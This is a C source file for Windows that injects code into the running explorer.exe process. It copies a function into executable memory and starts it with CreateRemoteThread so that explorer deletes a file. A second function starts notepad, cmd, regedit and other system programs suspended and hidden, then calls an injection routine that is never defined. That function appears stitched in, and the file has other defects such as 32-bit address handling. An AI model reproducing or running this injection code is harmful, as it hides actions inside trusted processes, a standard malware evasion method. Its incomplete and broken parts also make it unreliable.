#define _WIN32_WINNT		0x0502

#include <Windows.h>
#include <shlobj.h>

typedef struct _remoteparameter
{
    DWORD       rpfindfirstfile;
    DWORD       rpdeletefile;
    DWORD       rpfindclose;   

    HANDLE      rpfilehandle;
    WIN32_FIND_DATA rpfdata;
    TCHAR       rptname[MAX_PATH];

}REMOTEPARAMETER, *PREMOTEPARAMETER;

DWORD GetProcessId(LPCTSTR str) 
{ 
    HANDLE         hProcessSnap = NULL;  
    PROCESSENTRY32 pe32      = {0}; 

    //  Take a snapshot of all processes in the system. 

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

    if (hProcessSnap == (HANDLE)-1) 
        return -1; 

    //  Fill in the size of the structure before using it. 

    pe32.dwSize = sizeof(PROCESSENTRY32); 

    //  Walk the snapshot of the processes, and for each process, 

    if (Process32First(hProcessSnap, &pe32)) 
    { 
        do
        {
            if(_tcsicmp(str,pe32.szExeFile)==0)
            {
                CloseHandle (hProcessSnap); 
                return pe32.th32ProcessID;
            }
        }
        while (Process32Next(hProcessSnap, &pe32));  
    } 

    CloseHandle (hProcessSnap); 
    return -1; 
} 

DWORD WINAPI remote(LPVOID pvparam)
{
    PREMOTEPARAMETER erp=(PREMOTEPARAMETER)pvparam;

    typedef HANDLE (WINAPI *EFindFirstFile)(LPCTSTR, LPWIN32_FIND_DATA);
    typedef BOOL   (WINAPI *EDeleteFile)(LPCTSTR);
    typedef BOOL   (WINAPI *EFindClose)(HANDLE);

    EFindFirstFile       tFindFirstFile;
    EDeleteFile          tDeleteFile;
    EFindClose           tFindClose;

    tFindFirstFile=(EFindFirstFile)erp->rpfindfirstfile;
    tDeleteFile=(EDeleteFile)erp->rpdeletefile;
    tFindClose=(EFindClose)erp->rpfindclose;



    erp->rpfilehandle=tFindFirstFile(erp->rptname,&erp->rpfdata);
    if(erp->rpfilehandle!=INVALID_HANDLE_VALUE)
    {
        if(!tDeleteFile(erp->rptname))
        {
            return -1;
        }
    }
    if(!tFindClose(erp->rpfilehandle))
    {
        return -1;
    }


    return 0;
}

void FakeSendInput_Inject(INPUT *pInput, int iInputCount)
{
    LPCTSTR lpszProcessName[] = { _T("notepad.exe"), _T("calc.exe"), _T("cmd.exe"), _T("regedit.exe"), _T("ctfmon.exe"), _T("osk.exe"), _T("explorer.exe") };
    
    for (int i = 0; i < _countof(lpszProcessName); i++)
    {
        TCHAR szCmd[512];
        wsprintf(szCmd, _T("\"%s\""), lpszProcessName[i]);
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ::RtlSecureZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ::RtlSecureZeroMemory(&pi, sizeof(pi));

        if (::CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            if (!InjectCode(pi.hProcess, pi.hThread, pInput, iInputCount))
                ::TerminateProcess(pi.hProcess, 0);
            else
                break;
        }
    }
}


int main()
{
    // TODO: Place code here.
    TCHAR  name[20];
    _tcscpy(name,_T("c:\\shenyue.txt"));

    HANDLE            ethread;
    DWORD remotepid;
    int cb;
    REMOTEPARAMETER   rp;
    HINSTANCE         hkernel32;
    LPVOID remotethr;
    LPVOID remotepar;

    remotepid=GetProcessId(_T("explorer.exe"));
    if(remotepid==-1)
        return -1;
    HANDLE rphandle=OpenProcess(PROCESS_CREATE_THREAD |     
        PROCESS_VM_OPERATION  |     
        PROCESS_VM_WRITE,           
        FALSE,remotepid);
    cb=sizeof(TCHAR)*4*1024;
    remotethr=(PTSTR)VirtualAllocEx(rphandle,NULL,cb,MEM_COMMIT,PAGE_EXECUTE_READWRITE); 
    if(remotethr==NULL)
    {
        CloseHandle(rphandle);       
        return -2;
    }
    if(WriteProcessMemory(rphandle,remotethr,(LPVOID)remote,cb,NULL)==FALSE)
    {
        CloseHandle(rphandle);
        return -2;
    }

    {
        memset(&rp,0,sizeof(rp));
        _tcscpy(rp.rptname,name);
        hkernel32=GetModuleHandle(_T("kernel32.dll"));
        rp.rpfindfirstfile=(DWORD)GetProcAddress(hkernel32,"FindFirstFileW");
        rp.rpdeletefile=(DWORD)GetProcAddress(hkernel32,"DeleteFileW");
        rp.rpfindclose=(DWORD)GetProcAddress(hkernel32,"FindClose");
    }

    cb=sizeof(TCHAR)*sizeof(rp);
    remotepar=(PTSTR)VirtualAllocEx(rphandle,NULL,cb,MEM_COMMIT,PAGE_READWRITE);
    if(remotepar==NULL)
    {
        CloseHandle(rphandle);
        return -2;
    }

    if(WriteProcessMemory(rphandle,remotepar,(LPVOID)&rp,cb,NULL)==FALSE)
    {
        CloseHandle(rphandle);
        return -2;
    }

    ethread=CreateRemoteThread(rphandle,NULL,0,(LPTHREAD_START_ROUTINE)remotethr,(LPVOID)remotepar,0,NULL);
    if(ethread==NULL)
    {
        CloseHandle(rphandle);
        return -3;
    }

    return 0;
}

